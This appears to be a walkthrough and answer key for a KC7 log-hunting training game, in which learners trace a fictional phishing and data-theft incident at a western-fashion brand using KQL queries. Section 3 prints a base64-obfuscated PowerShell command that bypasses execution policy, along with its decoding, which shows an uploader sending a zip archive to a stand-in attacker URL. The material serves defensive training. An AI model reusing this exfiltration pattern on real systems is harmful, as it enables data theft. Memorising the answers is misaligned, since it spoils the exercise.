# Cowboy Couture

# Section 1: What’s a query?

### Question 1

Celestial Cowboy Couture, located in Deadwood, South Dakota, is on the verge of a huge breakthrough. The brand has gained increased exposure after world-famous male model John Strand starred in their latest advertising campaign. The campaign was a massive success, drawing global attention to the brand’s unique blend of cowboy and space fashion.

![](https://nm0g0vqj.tinifycdn.com/photos/JSCelestialPoster%20(1).png)

Unfortunately, this increased attention has also attracted cybercriminals eager to profit from the brand’s growth and popularity.

Your job is to uncover how these cybercriminals stole valuable information. By investigating the clues and analyzing the data, you can help to restore Celestial Cowboy Couture’s reputation.

**Enter `giddy up` to get started**

### Question 2

Let's get familiar with the team at Celestial Cowboy Couture.

The `Employees` table contains information about all the ranch hands who are part of the company.

We'll use KQL (Kusto Query Language) queries to explore our data. Don’t worry, we’ll provide all the queries in this game, so you don’t need to learn how to write them yourself… yet.

For each query we provide, you can simply copy and paste it into the query pane on the right, and then click `run`.

![Gif showing click to run query](https://nm0g0vqj.tinifycdn.com/gifs/click%20to%20run.gif)

Let’s saddle up and try it out. The following query fetches all the details about the Director of Happiness at the Celestial Ranch:

```sql
Employees
| where role == "Director of Happiness"
```

**What is the name of the Director of Happiness?**

> `Jason Blanchard`
> 

### Question 3

Fantastic!

The `==` operator filters for values that are an exact match and is case sensitve.

```sql
Employees
| where name == "Mary Ellen Kennel"
```

**What is Mary Ellen Kennel's role?**

> `Designer`
> 

### Question 4

Bullseye!🎯

In instances where we don’t have an exact value, we can use the `contains` operator instead.

For example, we know we have an employee who's a model at Celestial Cowboy Couture, but we don't know exactly what kind. Hand Model? Hot Model? The `contains` operator helps us find it, and it’s not case-sensitive.

```sql
Employees
| where role contains "model"
```

**What is our model's exact role?**

> `Underwear Model`
> 

### Question 5

Let's learn more about our **Underwear Model**!

We'll start by finding John Strand's IP Address.

An IP address is like the homestead or ranch location for your device on the internet frontier. Just like your ranch's address tells visitors where to find you, an IP address points out where to send data to your computer or phone. It’s how your device hollers out to websites and other devices across the network, ensuring the information arrives at the right place—whether it’s deep in cyberspace or the wide open plains of the internet.

```sql
Employees
| where name == "John Strand"
```

**What is John Strand's IP Address?**

> `10.10.0.3`
> 

### Question 6

Next, we'll identify John's hostname💻. This will help us track and understand the activities on his computer.

![](https://miro.medium.com/v2/resize:fit:960/1*jMFarhXAMWCW6ygfVY9OGw.gif)

**What is John Strand's hostname?**

> `PFW2-DESKTOP`
> 

### Question 7

It might also help to figure out John's email address. That way we can check out what mail he sent and received.

![](https://nm0g0vqj.tinifycdn.com/photos/ponyexpress.png)

**What is John Strand's email address?**

> `john_strand@celestialcowboycouture.com`
> 

### Question 8

In a security investigation, the `count` operator is useful for understanding the volume or frequency of certain events, such as how many times a particular **IP address** has accessed a system, how many failed login attempts occurred, or how many times a specific process has run. This can help you **quickly** identify suspicious activity, detect patterns, and prioritize areas that may require deeper investigation based on abnormal or high activity levels.

```sql
Email
|where recipient == "john_strand@celestialcowboycouture.com"
| count
```

**How many emails did John Strand receive?**

> `25`
> 

### Question 9

The `distinct` operator is super useful for filtering out duplicate data so that you're only looking at unique events or values. This can help you focus on key details, like identifying unique IP addresses, user accounts, or processes involved in an incident, without getting overwhelmed by repetitive or redundant entries. It allows you to streamline your analysis and spot patterns or anomalies more effectively.

```sql
ProcessEvents
| where hostname == "Put John's hostname here"
|distinct process_commandline
```

**How many distinct commands were run on John Strand's machine?**

> `148`
> 

```sql
ProcessEvents
| where hostname == "PFW2-DESKTOP"
|distinct process_commandline
| count
```

### Question 10

When in doubt you can do a `take 10` to quickly peek into a table and get a sense of what kind of data it holds.

```sql
(**Insert** **any** **table** name here)
| take 10
```

By grabbing just the first 10 rows, you can get an overview of the structure and contents without having to sift through massive amounts of data. This helps you decide where to focus your investigation and identify any key patterns or anomalies early on.

**Do a take 10 on any table and enter `mosey on` to continue.**

# Section 2: All about the dataz

![image.png](Cowboy%20Couture%202577141dc54380d9b277c1cdcb2cd873/image.png)

### Question 1

Now we should try to understand how to use the data available to us to conduct our investigation.

Here are the available data tables. Let's figure out how we can use these!

**Which table would tell us if John Strand received a suspicious email?**

> `Email`
> 

### Question 2

**Which table would tell us if he went to his bank website to see how much money he had?**

> `OutboundNetworkEvents`
> 

### Question 3

**Which table would tell us if John Strand saved a malicious file on his computer?**

> `FileCreationEvents`
> 

### Question 4

**Which table would tell us if John Strand opened that malicious file that was saved on his computer?**

> `ProcessEvents`
> 

### Question 5

**Which table would you look in to see if that malicious file was detected on John Strand's machine?**

> `SecurityAlerts`
> 

# Section 3: Cyber Cattle Thief

### Question 1

Well partner, it looks like you're ready to help us solve this cyber mystery! 🕵️‍♀️

Celestial Cowboy Couture has spent months planning and pouring money into launching their most anticipated collection. They even hired a superstar fashion CEO to take them to the next level and stand alongside the big French and Italian brands. Everything was set for the big launch, but just as they were ready to unveil the collection, an employee noticed something disturbing: some of their designs had already been knocked off and were available on **OutlawBuy.com**! 😱

![](https://nm0g0vqj.tinifycdn.com/photos/OutlawBuyWebsite.png)

Enter `Oh no` to continue.

### Question 2

You’ve just been hired at Celestial Cowboy Couture and you haven’t even been fully onboarded yet when Director of Happiness, Jason Blanchard, walks in. He’s not his usual upbeat self—he looks worried. Trying to keep a positive face, he says, “I know we’re not exactly known for being great at capitalism, but Celestial Cowboy Couture is counting on you to get to the bottom of this. If we don’t find out how this happened, we could be ruined.”

You got this job thanks to his “How to Hunt for Jobs like a Hacker” series, so you definitely don’t want to let him down.

**Enter `Saddle up` to continue.**

### Question 3

While job hunting like a hacker, you went all-in and checked out every employee on LinkedIn. You remember seeing a spicy post from the Lead Fashion Designer, venting about not getting the promotion they were promised. Could a little workplace drama have caused them to leak the secret designs?

![](https://nm0g0vqj.tinifycdn.com/photos/Megan.png)

```sql
Employees
| where role == "Lead Fashion Designer"
```

**What is the name of the Lead Fashion Designer?**

> `Megan Lucia`
> 

### Question 4

Now that we know the name of the Lead Fashion Designer, let’s take things a step further.

In a suspected insider threat case, it's important to check the activity on the employee’s machine to see if they’ve accessed or created any suspicious files. We can do this by pivoting to the FileCreations table and reviewing the file activity on Megan's device.

```sql
FileCreationEvents
| **where** hostname == "Enter Megan's Hostname"
| **order** **by** timestamp **desc**
```

**Does it look like Megan was up to suspicious activity that needs to be investigated further?** (Yes/No)

> `Yes`
> 

```sql
FileCreationEvents
| where hostname == 'ITCK-MACHINE'
| order by timestamp desc
| project-keep filename, path
```

![image.png](Cowboy%20Couture%202577141dc54380d9b277c1cdcb2cd873/image%201.png)

### Question 5

After discovering suspicious activity on Megan's machine, you start to notice something odd. When cybercriminals or insiders are planning to steal data, they often compress files into a zip format to make them smaller and easier to send out of the network undetected.

**How many of these zip files were created on Megan's machine?**

> `4`
> 

```sql
FileCreationEvents
| where hostname == 'ITCK-MACHINE'
| where filename endswith "zip"
| distinct filename
| count 
```

### Question 6

Not only were zip files created, but they were also placed in a suspicious folder with a pretty telling name! 😱

It’s common for attackers to organize the data they’re planning to exfiltrate in a way that’s easy to find.

**What folder were the zip files placed in on Megan's machine?**

> `designs_to_steal`
> 

```sql
FileCreationEvents
| where hostname == 'ITCK-MACHINE'
| where filename endswith "zip"
| project-keep path
```

![image.png](Cowboy%20Couture%202577141dc54380d9b277c1cdcb2cd873/image%202.png)

### Question 7

An executable file, `advanced-uploader.exe`, appears on Megan’s machine after the creation of the zip files. Executable files, or .exe files, are programs that can run on a computer. This could be a tool used to move data out of the network,

**What is the timestamp for when this file was created?**

> `10/2/2024, 8:36:47 AM`
> 

```sql
FileCreationEvents
| where hostname == 'ITCK-MACHINE' and filename == "advanced-uploader.exe"
```

### Question 8

Now that we’ve identified the suspicious `advanced-uploader.exe` file, the next step is to check if this file was actually run on Megan’s machine. To do this, we’ll look at the `ProcessEvents` table, which records all processes that have been executed. If we find evidence of this file being run, it could confirm that it was used to exfiltrate the stolen designs.

```sql
ProcessEvents
| where hostname == "ITCK-MACHINE"
| where process_name == "advanced-uploader.exe"
```

**Was this process executed on Megan's machine?**(Yes/No)

> `Yes`
> 

```sql
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
```

### Question 9

This is not looking good! The advanced-uploader.exe process was executed using an encrypted base64 command. Attackers often encode their commands to hide malicious activity and make it harder to detect.

Luckily, we can use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to easily decode base64 and analyze what the command was doing.

**What is the full URL where the files were exfiltrated to?**

> `http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin`
> 

```bash
                                  
❯ cat > b64                  
QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=   
KC7 on  main [?] took 5s 
                                                                          

❯ base64 -d b64 > decode
                                                                         
❯ cat decode      
C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$rev = '3 yrter-- BM5 ezis-knuhc-- tpyrcne-- nihsuptiteekantraperehtakoolotnihtontnia/moc.yrrebelkcuh-ruoy-mi//:ptth tsed-- piz.tool_deossal\cilbuP\sresU\:C elif-- exe.redaolpu-decnavda';$rev[::-1]"                                                                                                 
❯ echo '3 yrter-- BM5 ezis-knuhc-- tpyrcne-- nihsuptiteekantraperehtakoolotnihtontnia/moc.yrrebelkcuh-ruoy-mi//:ptth tsed-- piz.tool_deossal\cilbuP\sresU\:C elif-- exe.redaolpu-decnavda' | rev
lassoed_loot.zip --dest http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin --encrypt --chunk-size 5MB --retry 3 
```

### Question 10

It sure looks👀 like Megan is guilty, but just as you’re about to wrap up your investigation and call it a day, you get an unexpected message in your Teams chat.

![](https://nm0g0vqj.tinifycdn.com/photos/teamsmemes-chat.jpg)

**What database table contains evidence of employee logins?**

> `AuthenticationEvents`
> 

### Question 11

In Megan’s login history, one of these logins stands out from the others! It contains a different source IP and user-agent. This is called an anomaly and could be the key🔑 to uncovering more about the attack.

**Paste the timestamp for when that anomalous login occurred.**

> `9/23/2024, 6:58:54 AM`
> 

```bash
AuthenticationEvents
| where username == "melucia"
| where result == "Successful Login"
| summarize count() by src_ip
```

![image.png](Cowboy%20Couture%202577141dc54380d9b277c1cdcb2cd873/image%203.png)

```bash
AuthenticationEvents
| where src_ip == "192.124.249.15"
| where hostname == "ITCK-MACHINE"
```

### Question 12

**What is the source IP used for that login?**

> `192.124.249.15`
> 

# Section 4: Cowhands-on-Keyboard

### Question 1

You thought you had it all figured out, but this new discovery has left you confused. **What does this mean?** You want to reach out to Wade for help, but you remember that he's about to give his closing keynote. Frustrated, you sift through your CISSP notes, but can't find anything there to help you think through this problem.

![](https://nm0g0vqj.tinifycdn.com/photos/NotACISSP.png)

Then, you remember some of the questions you answered earlier in this training module and it suddenly hits you. You know just what to do!

**Enter `Anyone can do it!` to continue**

### Question 2

Earlier in your investigation you learned about the `count` operator and how it can help you quickly uncover patterns of behavior.

![](https://nm0g0vqj.tinifycdn.com/photos/flashback.png)

With this in mind, you query the authentication logs to see how many times the suspicious 192.124.249.15 IP was used to successfully login.

```bash
AuthenticationEvents
| where src_ip == "192.124.249.15" and result == "Successful Login"
| count
```

**How many succesful logins were made from that IP?**

> `2`
> 

### Question 3

You only observed one login into Megan’s account. Hmmm… 🤔 Who else’s account was accessed by this IP?

```bash
AuthenticationEvents
| where src_ip == "192.124.249.15" and result == "Successful Login"
```

**What is the username for the other employee that this IP was used to log into?**

> `jahartley`
> 

### Question 4

You've discovered a second employee who is possibly compromised! Let's dig deeper into who this employee is.

```bash
Employees
| where username == "jahartley"
```

**What is this employee's role?**

> `CEO`
> 

### Question 5

Oh no!🤦‍♂️ It’s our new CEO!

This doesn’t look good, so you continue digging into the activity on their machine.

To keep the investigation focused, we can timebound our analysis. This means narrowing down the logs to events that happened after the suspicious login, helping us focus on relevant activity and reduce unnecessary noise.

Not long after the user behind the 192.124.249.15 IP accessed the CEO’s machine, there’s evidence of them establishing persistence.

Persistence usually involves placing a hidden program or a **backdoor** on the system, allowing the attacker to come back and access the system whenever they want, without being noticed.

```bash
ProcessEvents
|where hostname == "CEO's hostname goes here"
| where timestamp between 
        (datetime(2024-09-19T06:25:59Z) .. datetime(2024-09-20T15:25:27Z))
```

**Enter the timestamp for when the attacker established persisitence.**

> `9/20/2024, 4:39:09 AM`
> 

```bash
ProcessEvents
|where hostname == "JHTJ-DESKTOP"
| where timestamp > datetime(9/19/2024, 6:25:59 AM)
| order by timestamp asc
| project-keep process_commandline, timestamp
```

![image.png](Cowboy%20Couture%202577141dc54380d9b277c1cdcb2cd873/image%204.png)

### Question 6

This no longer looks like the actions of a disgruntled designer. Right now, your best indicator is the suspicious IP address. Let’s see if we can leverage some threat intelligence to help the investigation.

You can use the PassiveDns table to map the IP address to domains to gain greater insight into the attacker's infrastructure.

```bash
PassiveDns
| where ip == "192.124.249.15"
| distinct domain
```

**How many domains does the 192.124.249.15 IP resolve to?**

> `2`
> 

### Question 7

Attackers will often use multiple domains, IPs, and email addresses during an attack. Let’s continue to pivot within the PassiveDNS table to see if you can uncover any more IPs or domains connected to this attacker’s infrastructure.

```bash
 PassiveDns
 | where domain in ("secure-celestial.com",
   "celestialcowboy-support.com")
```

**What newly uncovered IP resolves to the `secure-celestial.com` domain?**

> `142.250.191.78`
> 

### Question 8

You keep finding more! Let's pivot one more time to see if you can continue to uncover any additional domains. Why not, right? Pivoting is fun!

```bash
let all_ips = PassiveDns
|where domain in ("secure-celestial.com", 
    "celestialcowboy-support.com")
|distinct ip;
PassiveDns
| where ip in (all_ips)
|distinct domain
```

**What is the name of the next domain that you've uncovered?**

> `cccouture-hr-update.com`
> 

### Question 9

You can now use these new indicators to pivot into the web browsing logs and check if there has been any traffic to the uncovered domains. This can potentially help us understand how Jane and Megan were initially compromised.

```bash
 OutboundNetworkEvents
 | where url has_any ("cccouture-hr-update.com", 
 "celestialcowboy-support.com",
 "secure-celestial.com")
```

**Is there any evidence of network traffic to any of those domains?** (Yes/No)

> `Yes`
> 

### Question 10

It looks like our employees visited these attacker-controlled websites and entered their credentials! This is a clear violation of our company's Acceptable Use Policy, which emphasizes the importance of verifying URLs and avoiding suspicious links. Failing to follow these guidelines has opened the door to a serious compromise! 🤬

But hold your horses🐎—how did Jane and Megan get tricked into visiting these sites? Were they lured in like cattle to a rustler’s corral?

Another table that logs URL links is the `Email` table, which may give us clues about how these attacks started. Let’s check there to see if anything stands out.

```bash
 Email
 | where link has_any ("cccouture-hr-update.com", 
 "celestialcowboy-support.com",
 "secure-celestial.com") and recipient has "lucia"
```

**What is the subject of the email sent to Megan Lucia?**

> `URGENT: From your CEO - Immediate Action Required: You are getting promoted Cowboy!!!!`
> 

### Question 11

Most KC7 games are modeled after the TTPs of real-world threat actors that we've investigated as part of the MSTIC and GHOST teams. But for the **2024 Wild West Hackin' Fest**, we thought we’d shake things up and let fate decide the attack! We drew random cards from the Backdoors & Breaches deck, and the rest, as they say, is history.

Now, it’s your turn to figure out which [cards](https://bnb.silverday.de/about/cards.php) match up with what you’ve uncovered in the data. The clues are all there—can you piece it together?

**Which Backdoors & Breaches initial compromise card was played here?**

> `Phish`
> 

### Question 12

In the end, your hard work paid off, and you successfully cleared Megan of any wrongdoing. The real culprit was identified, and Celestial Cowboy Couture’s reputation was restored. CEO Jane Hartley, recognizing her earlier mistake in overlooking Megan’s contributions, finally gave her that long-deserved promotion. With Megan leading the way, the team quickly pivoted and designed a new collection that made an international splash.

![](https://nm0g0vqj.tinifycdn.com/photos/Vogue%20Fashion%20Magazine%20Cover.png)

Now, every year in October, hundreds of well-dressed ~~cult members~~ fans descend upon the little town of Deadwood to celebrate the brand’s innovative designs and its unique contribution to the fashion world. Celestial Cowboy Couture not only recovered from the breach but also cemented its legacy as a forward-thinking, boundary-pushing brand in the global fashion scene.

**Enter `Happy Trails` to complete this investigation.**
